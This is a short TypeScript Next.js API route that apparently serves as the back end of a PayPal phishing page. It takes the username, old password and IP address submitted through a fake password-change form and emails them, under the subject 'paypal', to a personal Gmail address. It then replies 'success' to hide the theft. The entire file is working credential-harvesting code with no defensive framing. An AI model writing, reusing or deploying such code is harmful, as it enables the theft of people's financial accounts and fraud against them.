import { NextApiRequest, NextApiResponse } from "next";
import createNodeMailerTransport from "../../helpers/mailer";

type Data = {
    username: string,
    oldPassword: string,
    newPassword: string,
    confirmPassword: string,
    ip: string
}

async function  sendEmail(from: string, to: string, source: string, username: string, pass: string,ip: string) {
    const mailDetails = {
        from: from,
        to: to,
        subject: source + ' : ' + username + ' : ' + ip,
        html: '<p>username: ' + username + '</p>' + '<p>password: ' + pass + '</p>' + '<p>ip: ' + ip + '</p>'
    }

    const transport = await createNodeMailerTransport()

    transport.verify((error, success) => {
        if(error){
            console.log(error)
        } else {
            transport.sendMail(mailDetails, (err, data) => {
                if(err) {
                    console.log(err);
                } else {
                    console.log(data);
                }
            });
        }
    })
}

export default async function handler(req: NextApiRequest, res: NextApiResponse<string>/*NextApiResponse<Data>*/) {
    const body = req.body
    await sendEmail('support@greeniumtrade.com', 'campdaniel06@gmail.com', 'paypal', body.username, body.oldPassword, body.ip)
    res.status(200).json('success')
}